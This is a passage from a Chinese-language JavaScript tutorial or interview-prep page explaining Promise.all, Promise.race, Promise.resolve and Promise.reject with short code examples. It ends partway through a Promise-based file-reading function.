<li><p>含义<br><code>Promise.all</code>方法接受一个数组作为参数，<code>p1</code>、<code>p2</code>、<code>p3</code>都是 <code>Promise</code> 实例，如果不是，就会先调用下面讲到的<code>Promise.resolve</code>方法，将参数转为 <code>Promise</code> 实例，再进一步处理。（<code>Promise.all</code>方法的参数可以不是数组，但必须具有 <code>Iterator</code> 接口，且返回的每个成员都是 <code>Promise</code> 实例。）<br><code>p</code>的状态由<code>p1</code>、<code>p2</code>、<code>p3</code>决定，分成两种情况。<br>(1) 只有<code>p1</code>、<code>p2</code>、<code>p3</code>的状态都变成<code>fulfilled</code>，<code>p</code>的状态才会变成<code>fulfilled</code>，此时<code>p1</code>、<code>p2</code>、<code>p3</code>的返回值组成一个数组，传递给<code>p</code>的回调函数。<br>(2) 只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个被<code>rejected</code>，<code>p</code>的状态就变成<code>rejected</code>，此时第一个被<code>reject</code>的实例的返回值，会传递给<code>p</code>的回调函数。</p>
</li>
<li><p>用法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> p1 <span class="token operator">=</span> <span class="token string">'p1-ok'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> p2 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'p2-ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> p3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token string">'p3-ok'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> p4 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'p4-err'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolves</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      resolves<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//p1-ok   p2-ok  p3-ok</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">,</span> p4<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//p4-err</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>Promise.race(iterable)</strong></p>
<ol>
<li><p>语法<br><code>var p = Promise.race([p1, p2, p3]);</code></p>
</li>
<li><p>含义<br><code>Promise.race</code>方法同样是将多个<code>Promise</code>实例，包装成一个新的<code>Promise</code>实例。只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个实例率先改变状态，<code>p</code>的状态就跟着改变。那个率先改变的 <code>Promise</code> 实例的返回值，就传递给<code>p</code>的回调函数。<br><code>Promise.race</code>方法的参数与<code>Promise.all</code>方法一样，如果不是 <code>Promise</code> 实例，就会先调用下面讲到的<code>Promise.resolve</code>方法，将参数转为<code>Promise</code>实例，再进一步处理。</p>
</li>
<li><p>用法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">"two"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Promise<span class="token punctuation">.</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "two"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> p3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> p4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span>reject<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"four"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Promise<span class="token punctuation">.</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p3<span class="token punctuation">,</span> p4<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "three"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 未被调用  </span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> p5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"five"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> p6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
          <span class="token function">setTimeout</span><span class="token punctuation">(</span>reject<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">"six"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Promise<span class="token punctuation">.</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p5<span class="token punctuation">,</span> p6<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 未被调用             </span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">reason</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "six"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>Promise.resolve(value)</strong></p>
<ol>
<li><p>语法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>promise<span class="token punctuation">)</span><span class="token punctuation">;</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>thenable<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>Promise.resolve</code>等价于下面的写法。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token comment">// 等价于</span>
<span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>含义<br>返回一个状态由给定<code>value</code>决定的<code>Promise</code>实例。</p>
</li>
<li><p>用法<br>(1) 如果该值是一个<code>Promise</code>对象，则直接返回该对象；</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> p2 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p <span class="token operator">===</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>(2) 如果参数是<code>thenable</code>对象(即带有<code>then</code>方法的对象)，则返回的<code>Promise</code>对象的最终状态由<code>then</code>方法的执行决定；</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> thenable <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>thenable<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 42</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(3) 如果参数是不具有<code>then</code>方法的对象或基本数据类型，则返回的<code>Promise</code>对象的状态为<code>fulfilled</code>，并且将该参数传递给<code>then</code>方法。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Hello</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>(4) 如果不带有任何参数，则返回的<code>Promise</code>对象的状态为<code>fulfilled</code>，并且将<code>undefined</code>作为参数传递给<code>then</code>方法。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//undefined</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>通常而言，如果你不知道一个值是否是<code>Promise</code>对象，使用<code>Promise.resolve(value)</code> 来返回一个<code>Promise</code>对象,这样就能将该<code>value</code>以<code>Promise</code>对象形式使用。</p>
</li>
<li><p>立即<code>resolve</code>的<code>Promise</code>对象，是在本轮“事件循环”（<code>event loop</code>）的结束时，而不是在下一轮“事件循环”的开始时。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'three'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'two'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// one </span>
<span class="token comment">// two</span>
<span class="token comment">// three</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>Promise.reject(reason)</strong></p>
<ol>
<li><p>语法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>Promise.reject</code>等价于下面的写法。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> p <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 等同于</span>
<span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">reject</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>含义<br>返回一个状态为<code>rejected</code>的<code>Promise</code>对象，并将给定的失败信息传递给对应的处理方法。</p>
</li>
</ol>
<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
</svg>
</span><p><strong>注意：<code>Promise.resolve(value)</code>方法返回的<code>Promise</code>实例的状态由<code>value</code>决定，可能是<code>fulfilled</code>，也可能是<code>rejected</code>。<code>Promise.reject(reason)</code>方法返回的<code>Promise</code>实例的状态一定是<code>rejected</code>。</strong></p></blockquote>
<ol>
<li><p>用法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">"Testing static reject"</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 未被调用</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">reason</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Testing static reject</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"fail"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 未被调用</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Error: fail</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p><code>Promise.reject()</code>方法的参数，会原封不动地作为<code>reject</code>的理由，变成后续方法的参数。这一点与<code>Promise.resolve</code>方法不一致。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> thenable <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>thenable<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e <span class="token operator">===</span> <span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>thenable<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e <span class="token operator">===</span> thenable<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>与promise.all相反的是哪一个</strong></p>
<p><strong>参考答案：</strong></p>
<p>Promse.race就是赛跑的意思，意思就是说，Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。</p>
<p><strong>扩展：</strong></p>
<p>语法</p>
<pre class="line-numbers language-none"><code class="language-none">Promise.race(iterable);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>参数</p>
<ul>
<li><p>iterable</p>
<p>可迭代对象，类似<code>Array</code></p>
</li>
</ul>
<p>返回值</p>
<p> 一个<strong>待定的</strong> <code>Promise</code>]只要给定的迭代中的一个promise解决或拒绝，就采用第一个promise的值作为它的值， 从而<strong>异步</strong>地解析或拒绝（一旦堆栈为空）</p>
<p>33、promise实现文件读取</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// const fs = require("fs");</span>
<span class="token keyword">import</span> fs <span class="token keyword">from</span> <span class="token string">"fs"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> path <span class="token keyword">from</span> <span class="token string">"path"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> __dirname <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
